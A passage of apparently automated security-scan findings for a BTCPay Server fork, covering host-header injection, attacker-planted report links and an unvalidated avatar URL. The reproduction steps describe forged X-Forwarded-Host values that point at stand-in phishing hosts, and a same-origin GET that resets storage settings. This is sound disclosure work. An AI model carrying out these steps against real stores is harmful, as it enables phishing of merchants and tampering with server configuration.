The project already shows payer-authored URLs on the invoice details page, but there PosDataEntry.cshtml renders `<a href="@str" rel="noreferrer noopener">@str</a>` so the destination is visible; the report hides it behind a fixed label and an attacker-chosen column title, which is the misrepresentation. The startsWith('http') check excludes javascript:/data: schemes, so this is link planting rather than XSS; the direct effect is a minor integrity loss of the merchant report UI, with phishing of merchant credentials as the consequential risk.

## Evidence
1. [BTCPayServer/Views/UIReports/StoreReports.cshtml:145–151](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Views/UIReports/StoreReports.cshtml#L145-L151)
   Any report column whose name ends with 'url' and whose value starts with 'http' is rendered as `<a :href="value" target="_blank">Link</a>`; the destination is hidden behind the fixed label and the column title (titleCase(field.name), line 128) is the attacker's key name.
2. [BTCPayServer/Services/Reporting/InvoicesReportProvider.cs:232–293](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Reporting/InvoicesReportProvider.cs#L232-L293)
   FlattenFields walks the entire metadata JObject and promotes every nested property (including arbitrary posData keys) to a report column named after the property, with the value copied verbatim; only receiptData, itemDesc and posData.tax are skipped.
3. [BTCPayServer/Services/Reporting/InvoicesReportProvider.cs:140–156](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Reporting/InvoicesReportProvider.cs#L140-L156)
   Invoices with any payment, or with a non-trivial status (e.g. Expired+PaidPartial), are flattened and written to the report; a 1-sat or dust payment suffices.
4. [BTCPayServer/Plugins/Bitpay/Security/BitpayAuthorizationHandler.cs:51–58](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/Security/BitpayAuthorizationHandler.cs#L51-L58)
   When the store blob has AnyoneCanInvoice, the Anonymous Bitpay identity is granted CanCreateInvoice for that store.
5. [BTCPayServer/Plugins/Bitpay/Controllers/BitpayInvoiceController.cs:139–140](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/Controllers/BitpayInvoiceController.cs#L139-L140)
   Bitpay invoice creation stores the caller's posData string verbatim as Metadata.PosDataLegacy, so the caller chooses both key names and values.
6. [BTCPayServer/Services/Invoices/InvoiceEntity.cs:196–218](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Invoices/InvoiceEntity.cs#L196-L218)
   PosDataLegacy setter parses the string into the posData JObject that FlattenFields walks.
7. [BTCPayServer/Controllers/UIInvoiceController.cs:170–171](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIInvoiceController.cs#L170-L171)
   Greenfield CreateInvoice (GreenfieldInvoiceController.cs:169-172, policy CanCreateInvoice only) stores the request's metadata JObject verbatim, so an invoice-creating API key can plant the same *Url key at any depth without AnyoneCanInvoice.
8. [BTCPayServer/Views/Shared/PosDataEntry.cshtml:17](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Views/Shared/PosDataEntry.cshtml#L17)
   The sanctioned rendering of the same payer-authored URL on the invoice details page shows the URL as the link text (with rel=noreferrer noopener), so the destination is visible; the report's opaque 'Link' label is what the attacker gains over this path.

## Impact
The merchant backend report presents an attacker destination as a trusted 'Link' under an attacker-titled column; the direct effect on BTCPay is a minor integrity loss of the report UI (content the merchant takes as the system's own). The consequential risk, credential phishing of a store member, lands in the member's browser and cannot be demonstrated from the code alone, so it is not rated as a subsequent-system impact.

## Reproduction steps
1. Anonymous attacker on a store with 'Allow anyone to create invoice' enabled (the pay-button surface) POSTs a Bitpay invoice whose posData holds a *Url key pointing at their site, pays about one satoshi so the invoice is included in the report, and waits for a store member to open the Invoices report and click the opaque 'Link' (an active click on a control they routinely use). Alternatively a Greenfield key holding only CanCreateInvoice plants the key in metadata directly. Requires the store to have enabled anonymous invoice creation or the attacker to hold an invoice-creating key, plus a token payment: AT:PRESENT.

## Recommended fix
StoreReports.cshtml hyperlinks any column named *url behind a generic 'Link' label, and InvoicesReportProvider.FlattenFields promotes attacker-authored metadata keys (including nested posData keys) to column names and link candidates. Fix criteria: Only server-defined columns (e.g. orderUrl set by the PoS/crowdfund controllers) are rendered as links, or every link shows its full URL as the visible text so the destination is never hidden; metadata-derived columns from invoice-creator-writable sources (posData, arbitrary metadata, form responses) are rendered as plain text, so no anonymous or invoice-creating input can produce an opaque clickable off-site 'Link' in the merchant report.

---
**Severity:** LOW
**Status:** Open
**Category:** UI misrepresentation of link target
**CWE:** [CWE-451](https://cwe.mitre.org/data/definitions/451.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257710

---

# Payer's forwarded Host becomes the invoice OrderUrl rendered as the Order Id link on the merchant's invoice page

## Details
The anonymous PoS checkout (POST /apps/{appId}/pos, UIPointOfSaleController.cs:186-192), the anonymous LNURL PoS endpoint (UILNURLController.cs:350) and the anonymous crowdfund contribution (UICrowdfundController.cs:210-212, 237) persist a URL derived from the *payer's own request authority* onto the invoice as Metadata.OrderUrl: Request.GetDisplayUrl() (scheme://host/pathbase/path?query) or GetAbsoluteUri(appPath). Startup.cs:325-333 registers ForwardedHeaders.All with KnownProxies/KnownIPNetworks cleared and no AllowedHosts, so Request.Host/Scheme are whatever the payer sent in X-Forwarded-Host/X-Forwarded-Proto (on a bare Kestrel deployment the raw Host header suffices). The payer therefore chooses the host of the stored OrderUrl, and via the request path/query its remaining content.

The stored value is rendered to a different principal: the merchant's invoice details page (GET /invoices/{id}, CanViewInvoices) sets OrderUrl = GetSafeHttpUrl(invoice.Metadata.OrderUrl) (UIInvoiceController.UI.cs:149) and Invoice.cshtml:242-246 emits it as the href of the Order Id link, labelled with the invoice's real order id. GetSafeHttpUrl (UIInvoiceController.UI.cs:1194-1199) only checks that the scheme is http/https; the host is never compared with ServerSettings.BaseUrl or the server's own host. The operator-configured ServerSettings.BaseUrl (used by CallbackGenerator for trusted link hosts) is never consulted on this path, so the issue holds on fully configured deployments.

Attack: an anonymous payer POSTs an order to any public PoS or crowdfund app with X-Forwarded-Host: btcpay-login.attacker.example (optionally X-Forwarded-Proto: https); the resulting invoice, which appears legitimately in the merchant's invoice list with correct amounts and order id, carries an Order Id link to https://btcpay-login.attacker.example/apps/{appId}/pos?... The merchant reviewing the invoice clicks the link the UI offers for order lookup and lands on the attacker's page (e.g. a cloned BTCPay login). The payer has no sanctioned way to set OrderUrl on PoS/crowdfund invoices (only the merchant can, via Greenfield), so this is new reach over the merchant's trusted backend UI.

Scope note: the same requests also default Checkout.RedirectURL to Url.ActionAbsolute(Request, ...) / GetAbsoluteUri on the forwarded host, but the payer already controls RedirectURL fully through the documented `redirectUrl` form parameter (verified record pos-payer-controlled-redirecturl-open-redirect), so the RedirectUrl links on the invoice page and list are not a gain of this mechanism and are not claimed here. The Invoices report emits no OrderUrl column, so StoreReports is not a sink.

Assumptions: ASP.NET Core ForwardedHeadersMiddleware (net10.0 shared framework) applies X-Forwarded-Host/Proto from any remote when KnownProxies/KnownIPNetworks are empty and AllowedHosts is unset (consistent with the scan's established fact), and any fronting reverse proxy passes the client's X-Forwarded-Host through (nginx forwards unknown request headers unless overridden).

## Evidence
1. [BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs:407](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs#L407)
   Anonymous PoS checkout persists Metadata.OrderUrl = Request.GetDisplayUrl(), i.e. scheme://host[pathbase]/path?query of the payer's own request; Request.Scheme/Host are whatever the payer's X-Forwarded-Proto/X-Forwarded-Host (or raw Host on bare Kestrel) said. Primary location: the fix must derive this URL from the configured base URL instead.
2. [BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs:186–191](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs#L186-L191)
   The endpoint is anonymous: [HttpPost("/apps/{appId}/pos/{viewType?}")], [IgnoreAntiforgeryToken], [EnableCors(All)], no [Authorize]; DomainMappingConstraint returns true for any host when appId is in the route.
3. [BTCPayServer/Hosting/Startup.cs:325–332](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/Startup.cs#L325-L332)
   ForwardedHeaders.All with KnownIPNetworks/KnownProxies cleared and no AllowedHosts: any peer's X-Forwarded-Host/X-Forwarded-Proto rewrite Request.Host/Scheme before routing (established fact). HeadersOverrideMiddleware only sets X-Forwarded-Proto from the xforwardedproto option and never strips X-Forwarded-Host.
4. [BTCPayServer/Views/UIInvoice/Invoice.cshtml:242–245](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Views/UIInvoice/Invoice.cshtml#L242-L245)
   Sink: the merchant's invoice details page (CanViewInvoices) renders Model.OrderUrl as the href of the Order Id link (class invoice-order-link, target=_blank), labelled with the invoice's own order id. PoS/LNURL/crowdfund invoices always carry an OrderId, so the link is always shown.
5. [BTCPayServer/Controllers/UIInvoiceController.UI.cs:149](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIInvoiceController.UI.cs#L149)
   The merchant view model takes OrderUrl = GetSafeHttpUrl(invoice.Metadata.OrderUrl) straight from the stored metadata.
6. [BTCPayServer/Controllers/UIInvoiceController.UI.cs:1194–1198](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIInvoiceController.UI.cs#L1194-L1198)
   GetSafeHttpUrl only requires an absolute http/https URI; no comparison with the configured ServerSettings.BaseUrl or the server's own host, so an attacker host passes to the href.
7. [BTCPayServer/Controllers/UILNURLController.cs:350](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UILNURLController.cs#L350)
   Sibling: the anonymous LNURL PoS endpoint stores OrderUrl = Request.GetDisplayUrl() from the same forwarded host.
8. [BTCPayServer/Plugins/Crowdfund/Controllers/UICrowdfundController.cs:210–211](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Crowdfund/Controllers/UICrowdfundController.cs#L210-L211)
   Sibling: the anonymous crowdfund contribution builds appUrl = HttpContext.Request.GetAbsoluteUri(appPath) from the payer's forwarded scheme/host.
9. [BTCPayServer/Plugins/Crowdfund/Controllers/UICrowdfundController.cs:237](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Crowdfund/Controllers/UICrowdfundController.cs#L237)
   That appUrl is persisted as entity.Metadata.OrderUrl, so crowdfund invoices carry the attacker host as their Order link too.
10. [BTCPayServer.Abstractions/Extensions/HttpRequestExtensions.cs:111–124](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Abstractions/Extensions/HttpRequestExtensions.cs#L111-L124)
   GetAbsoluteUri/GetAbsoluteUriNoPathBase concatenate request.Scheme + request.Host, never the configured base URL; RequestBaseUrl(HttpRequest) likewise copies request.Scheme/Host.

## Impact
A phishing primitive against merchants and admins: a BTCPay-generated Order Id link on the trusted backend invoice page is steered to an attacker host while carrying the invoice's genuine order id. The integrity of what the merchant is shown as the order URL is compromised (LOW); the flaw itself discloses nothing and does not affect availability. Any credential harvest happens on the attacker's page, outside this system's boundary.

## Reproduction steps
1. Attacker: anonymous payer (threat-model adversary 5, whose named aim includes injecting content shown to merchants). One unauthenticated POST to a public PoS/crowdfund app (rate-limited only by the 4 r/min PublicInvoices zone) with X-Forwarded-Host/Proto naming the attacker's host creates an invoice whose Order Id link points there. The merchant (any store member with CanViewInvoices) later opens the invoice page and clicks the order link the UI offers for order lookup (UI:ACTIVE). AT:PRESENT for the deployment condition the attacker does not control: the attacker's Host/X-Forwarded-Host must reach Kestrel unrewritten (true for bare Kestrel and for proxies that pass unknown headers through). No shipped control covers this path: ServerSettings.BaseUrl is never consulted and GetSafeHttpUrl checks only the scheme. Dependency assumption: ASP.NET Core ForwardedHeadersMiddleware (net10.0) honours X-Forwarded-Host from any peer when KnownProxies/KnownIPNetworks are empty and AllowedHosts is unset.

## Recommended fix
1. Invoice Metadata.OrderUrl on PoS, LNURL PoS and crowdfund invoices is built from the incoming request's scheme and host (Request.GetDisplayUrl / GetAbsoluteUri), which an anonymous payer controls through forwarded headers (or the raw Host header), and the value is persisted and later shown to merchants. Fix criteria: Server-generated URLs stored on invoices must take their authority from the operator-configured base URL (ServerSettings.BaseUrl via CallbackGenerator.GetRequestBaseUrl) or be stored path-relative; verify that a PoS, LNURL and crowdfund order submitted with X-Forwarded-Host: evil.example (and with a foreign Host header on bare Kestrel) yields an invoice whose OrderUrl host is the configured one.
2. Forwarded headers are honoured from any peer (ForwardedHeaders.All with KnownProxies/KnownIPNetworks cleared), so every Request.Host/Scheme-derived URL inherits the client's X-Forwarded-Host/Proto. Fix criteria: Honour X-Forwarded-* only from configured proxies/networks (or restrict ForwardedHeadersOptions.AllowedHosts to the server's hostnames); verify that X-Forwarded-Host from an untrusted peer no longer changes Request.Host.
3. The merchant invoice page renders stored OrderUrl as an href with only an http/https scheme check. Fix criteria: Render OrderUrl as a clickable link only when its host matches the server's configured base URL (or a merchant-configured app/store URL), otherwise as plain text; verify an invoice carrying an external OrderUrl shows no clickable order link on the merchant's invoice page.

---
**Severity:** LOW
**Status:** Open
**Category:** Host header injection
**CWE:** [CWE-348](https://cwe.mitre.org/data/definitions/348.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257650

---

# Anonymous payment-request form POST persists payer's forwarded Host as the {PaymentRequest.Link} base in merchant emails

## Details
PaymentRequestBlob.RequestBaseUrl is the base URL from which PaymentRequestTriggerProvider.GetEmailModel builds {PaymentRequest.Link}, the merchant-facing link in store email rules for payment-request events (the default 'Payment Request - Completed' body ends with 'Review the payment request: {PaymentRequest.Link}'). The field is normally written by merchant-authenticated paths (UI create/edit, Greenfield create/update), but the [AllowAnonymous] form endpoint ViewPaymentRequestForm (GET/POST /payment-requests/{payReqId}/form) also writes it: on a valid form POST, `if (prBlob.RequestBaseUrl is null) prBlob.RequestBaseUrl = Request.GetRequestBaseUrl().ToString()` and the blob is saved. Request.Scheme/Host are rewritten from X-Forwarded-Proto/X-Forwarded-Host supplied by any peer (Startup.cs registers ForwardedHeaders.All with KnownProxies/KnownIPNetworks cleared), so the payer chooses the stored base URL.

The null branch is reachable for payment requests that pre-date the RequestBaseUrl field and have not been re-saved by the merchant since (no migration back-fills it; PaymentRequestsMigratorHostedService only re-serialises the blob), provided the request has a form attached (FormId set) and the form has not yet been submitted (FormResponse null) - i.e. a merchant-issued request with a customer form that is still awaiting its payer. That payer, submitting the form with `X-Forwarded-Host: evil.example`, poisons the record: later UI edits keep any non-null value (line 305 fills nulls only), and when the payer then pays, UpdatePaymentRequestStatus fires StatusChanged/Completed, the merchant's rule renders {PaymentRequest.Link} as https://evil.example/payment-requests/<id>, and the merchant receives a genuine notification from their own store (correct id, title, amount, reference) whose 'Review the payment request' link lands on an attacker host that can mirror the BTCPay login page. The payer also authors the form content and email shown in the same mail. The operator-configured ServerSettings.BaseUrl (CallbackGenerator.GetRequestBaseUrl) is the project's trusted source for link hosts, and this path never consults it, so the issue holds on fully configured deployments.

Distinct from invoice-link-in-merchant-emails-from-payer-forwarded-host (InvoiceEntity.ServerUrl -> {Invoice.Link}): different stored field, different anonymous writer, different sink and fix location. Assumptions: ASP.NET Core ForwardedHeadersMiddleware (net10.0 shared framework) applies X-Forwarded-Host/-Proto from any remote when KnownProxies/KnownIPNetworks are empty and AllowedHosts is unset (consistent with the scan's established fact), and the fronting reverse proxy passes client X-Forwarded-Host through.

## Evidence
1. [BTCPayServer/Controllers/UIPaymentRequestController.cs:392–396](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIPaymentRequestController.cs#L392-L396)
   In the anonymous ViewPaymentRequestForm POST, when prBlob.RequestBaseUrl is null it is set to Request.GetRequestBaseUrl().ToString() (scheme://host[pathbase] of the payer's request) and the blob is saved with CreateOrUpdatePaymentRequest. This is the only unauthenticated writer of the field; the fix belongs here.
2. [BTCPayServer/Controllers/UIPaymentRequestController.cs:352–356](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIPaymentRequestController.cs#L352-L356)
   GET/POST {payReqId}/form is [AllowAnonymous]; it proceeds for any payment request whose blob has a FormId and no FormResponse yet (lines 358-363).
3. [BTCPayServer/Plugins/Webhooks/TriggerProviders/PaymentRequestTriggerProvider.cs:71–73](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Webhooks/TriggerProviders/PaymentRequestTriggerProvider.cs#L71-L73)
   GetEmailModel sets PaymentRequest.Link = linkGenerator.PaymentRequestLink(id, RequestBaseUrl.TryFromUrl(blob.RequestBaseUrl)) - the merchant-facing link is built on the stored per-record base URL, never on ServerSettings.BaseUrl.
4. [BTCPayServer/Plugins/Webhooks/WebhooksPlugin.cs:207–215](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Webhooks/WebhooksPlugin.cs#L207-L215)
   The default email for the 'Payment Request - Completed' trigger ends with 'Review the payment request: {PaymentRequest.Link}'; EmailRulesManage.cshtml:163-175 prefills a new rule's subject/body from this DefaultEmail, so a merchant who enables the completed-notification gets the link by default.
5. [BTCPayServer/Services/PaymentRequests/PaymentRequestRepository.cs:101–130](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/PaymentRequests/PaymentRequestRepository.cs#L101-L130)
   UpdatePaymentRequestStatus publishes PaymentRequestEvent.StatusChanged and, on Completed, PaymentRequestEvent.Completed - events the payer triggers by paying the request after poisoning it.
6. [BTCPayServer/Plugins/Emails/HostedServices/EmailRuleProcessorSender.cs:74–90](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Emails/HostedServices/EmailRuleProcessorSender.cs#L74-L90)
   Store email rules render the model into the body with HtmlEncoder (URL characters survive) and send the result to the rule's recipients, typically the merchant.
7. [BTCPayServer/Controllers/UIPaymentRequestController.cs:305–306](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIPaymentRequestController.cs#L305-L306)
   The merchant UI create/edit path sets RequestBaseUrl only for new requests or when it is null, so a value written by the payer survives every later UI edit; and it is why only records that pre-date the field (never re-saved since) still carry null.
8. [BTCPayServer/Controllers/GreenField/GreenfieldPaymentRequestsController.cs:217–225](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldPaymentRequestsController.cs#L217-L225)
   Greenfield create/update always rewrites the blob with RequestBaseUrl from the merchant's request: every request created or updated through either merchant path on this version has the field set, so the null branch at line 392 is reachable only for legacy records (and a later Greenfield update would overwrite a poisoned value, a UI edit would not).
9. [BTCPayServer/HostedServices/PaymentRequestsMigratorHostedService.cs:46–57](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/PaymentRequestsMigratorHostedService.cs#L46-L57)
   The only payment-request blob migration re-serialises the existing blob (SetBlob(GetBlob())); nothing back-fills RequestBaseUrl, so pre-existing requests keep null until something writes it.
10. [BTCPayServer/Hosting/Startup.cs:325–332](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/Startup.cs#L325-L332)
   ForwardedHeaders.All with KnownIPNetworks/KnownProxies cleared: any peer's X-Forwarded-Host/X-Forwarded-Proto rewrite Request.Host/Scheme, which GetRequestBaseUrl() copies verbatim (RequestBaseUrl.cs:43).
11. [BTCPayServer/Services/CallbackGenerator.cs:34–43](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/CallbackGenerator.cs#L34-L43)
   The project's trusted source for link hosts - the operator-configured ServerSettings.BaseUrl preferred over the request - which neither the form POST nor PaymentRequestTriggerProvider consults.

## Impact
A phishing primitive against the merchant: the 'Review the payment request' link in a legitimate store notification points at an attacker host that can mirror the login page to harvest credentials/2FA codes (confidentiality) and misrepresent the request's backend state; the payment-request record itself is permanently altered by an anonymous party (integrity). No secret token travels in the link and the server is otherwise unaffected, so both LOW; availability unaffected.

## Reproduction steps
1. Attacker: anonymous payer (threat-model adversary 5, whose named aim includes injecting content shown to merchants). They open a merchant-issued payment request that carries a form, fetch the form page, and POST it with X-Forwarded-Host/-Proto set to an attacker host; the value is persisted (AC:LOW - one header on a normal form submission). They then pay the request, which fires the Completed/StatusChanged events. AT:PRESENT for conditions the attacker does not control: the record must pre-date the RequestBaseUrl field and not have been re-saved by the merchant, and the store must have a payment-request email rule rendering {PaymentRequest.Link} (the default body for the Completed trigger does). The merchant, trusting a notification carrying their own payment-request data, clicks the review link and interacts with the phishing page (UI:ACTIVE). The shipped control for link hosts - the configured ServerSettings.BaseUrl - is bypassed because neither the writer nor the email model consults it. Dependency assumption: ASP.NET Core ForwardedHeadersMiddleware (net10.0) honours X-Forwarded-Host from any peer when KnownProxies/KnownIPNetworks are empty and AllowedHosts is unset.

## Recommended fix
1. The anonymous form POST writes the authority used for merchant-facing links into the payment request blob from the payer's Host/Scheme (forwarded headers trusted from any peer). Fix criteria: RequestBaseUrl is written only by merchant-authenticated paths or from the configured ServerSettings.BaseUrl / CallbackGenerator.GetRequestBaseUrl(); the anonymous form POST never writes it. Verify: submitting a legacy payment request's form with X-Forwarded-Host: evil.example leaves RequestBaseUrl unset or equal to the configured base URL.
2. PaymentRequest.Link in email models is built from the per-record stored base URL rather than the operator-configured ServerSettings.BaseUrl that CallbackGenerator already prefers, so any poisoning of the stored value propagates to notifications. Fix criteria: Merchant-facing links in email models are built from the configured ServerSettings.BaseUrl, falling back to the stored value only when none is configured. Verify: a blob whose RequestBaseUrl is an external host yields an email whose PaymentRequest.Link host is the configured base URL.
3. ForwardedHeadersOptions is registered with ForwardedHeaders.All and KnownProxies/KnownIPNetworks cleared, so X-Forwarded-Host/X-Forwarded-Proto from any peer rewrite Request.Host and Request.Scheme. Fix criteria: Forwarded headers are honoured only from configured reverse-proxy addresses/networks (or X-Forwarded-Host is excluded / constrained by AllowedHosts). Verify: a request carrying X-Forwarded-Host from a non-proxy peer leaves Request.Host equal to the connection's Host header.

---
**Severity:** LOW
**Status:** Open
**Category:** Host header injection
**CWE:** [CWE-348](https://cwe.mitre.org/data/definitions/348.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257649

---

# Unvalidated profile ImageUrl rendered on admin user page forces authenticated GETs and leaks admin IP

## Details
A user's profile picture is stored as a free-form string (UserBlob.ImageUrl, ApplicationUser.cs:61). The UI paths only ever write `fileid:<id>` references after a validated image upload (UIManageController.cs:199, UIServerController.Users.cs:165, Greenfield picture upload at GreenfieldUsersController.cs:285), but the Greenfield JSON endpoints store request.ImageUrl verbatim: PUT /api/v1/users/me (GreenfieldUsersController.cs:228-231) and POST /api/v1/users (line 376). There is no scheme, host or format check; the project's own tests round-trip the relative value `avatar.jpg` (GreenfieldAPITests.cs:291,1298). The permission required, btcpay.user.canmodifyprofile, is a User-type policy that any non-admin can grant to their own API key (UIManageController.APIKeys.cs:540,557 forbid only PolicyType.Server), or exercise through Greenfield Basic auth.

When a server administrator opens the user's detail page GET /server/users/{userId} (UIServerController.Users.cs:103) the stored value goes through UnresolvedUri.Create (UnresolvedUri.cs:8-16: anything not starting with `fileid:` becomes Raw) and UriResolver.Resolve (UriResolver.cs:30: Raw is returned unchanged), and Views/UIServer/User.cshtml:60 renders `<img src="@Model.ImageUrl">`. The `<img>` is rendered whenever FileService.IsAvailable() is true (line 10), and that is every deployment: MigrationStartupTask.cs:186-199 seeds a FileSystem StorageSettings record on first start (FileSystemStorageAsDefault), so IsAvailable() (FileService.cs:48-52, `settings is not null`) is always true. Razor attribute-encoding prevents markup injection, but the admin's browser still issues a GET to the attacker-chosen URL, and the system itself drives admins to this page: NewUserRequiresApprovalNotification.cs:55-57 sets the notification's ActionLink to /server/users/{userId}, and ListUsers.cshtml:111,126 link to it (View Invite / Edit).

1. Cross-origin URL: the global CSP (ContentSecurityPolicyAttribute.cs:20-29, applied in Startup.cs:167) sets only script-src 'self' and no img-src/default-src, so the request reaches the attacker's host and discloses the admin's IP address, User-Agent and the moment the admin reviews the account (Referrer-Policy same-origin suppresses only the Referer). This works on every deployment.

2. Same-origin URL (e.g. `/server/storage/FileSystem` or the absolute `https://<host>/server/storage/FileSystem`): the request carries the admin's Identity cookie (same-origin, so SameSite is irrelevant), UIServerController's class-level [Authorize(CanModifyServerSettings, Cookie)] (UIServerController.cs:47-48) is satisfied, and antiforgery validation is skipped for GET (UIControllerAntiforgeryTokenAttribute.cs:46-53). No fetch-metadata (Sec-Fetch-*) check exists anywhere in BTCPayServer/. Any GET endpoint with a side effect therefore executes with the admin's authority with no click. One such endpoint exists today: GET /server/storage/FileSystem (UIServerController.Storage.cs:218-223) calls SaveStorageProvider when the saved provider is not FileSystem, overwriting StorageSettings.Provider and Configuration (lines 266-269), i.e. the Azure Blob Storage connection string/container (Azure is the only other provider registered, StorageExtensions.cs:27-28) is discarded; every stored file URL (store logos, custom CSS, checkout sounds, PoS/crowdfund images, server branding, Greenfield files) is then computed by the FileSystem provider as /LocalStorage/{name} (FileService.cs:107-115, FileSystemFileProviderService.cs:37-41) and 404s, and new uploads land on local disk, until an admin re-enters the Azure configuration. The ApproveUser and ToggleUser GET actions (UIServerController.Users.cs:366-385, 412-423) only render a Confirm view, their POST twins do the work, so they are not reachable this way. The integrity/availability effect therefore holds when the instance has switched to Azure Blob Storage; the IP/UA/timing disclosure and the forced authenticated GET hold on the default deployment.

This vector is distinct from a cross-site CSRF against the same GET (recorded separately as server-storage-provider-get-side-effect): it is same-origin, so neither SameSite cookies nor a fetch-metadata policy would stop it, it needs no attacker-hosted page or admin click, and it is planted by a low-privileged account through a sanctioned API. The same pattern (Greenfield-settable raw URL rendered as a sub-resource on pages seen by other principals) also exists for store LogoUrl/CssUrl and PaymentSoundUrl; this record is for the user-level ImageUrl, which requires no store role at all.

## Evidence
1. [BTCPayServer/Controllers/GreenField/GreenfieldUsersController.cs:228–231](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldUsersController.cs#L228-L231)
   PUT /api/v1/users/me (policy btcpay.user.canmodifyprofile, line 155) copies request.ImageUrl into the user blob with no scheme, host or format validation; any absolute, relative or same-origin application path is accepted. This is the primary location the fix must change.
2. [BTCPayServer/Controllers/GreenField/GreenfieldUsersController.cs:376](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldUsersController.cs#L376)
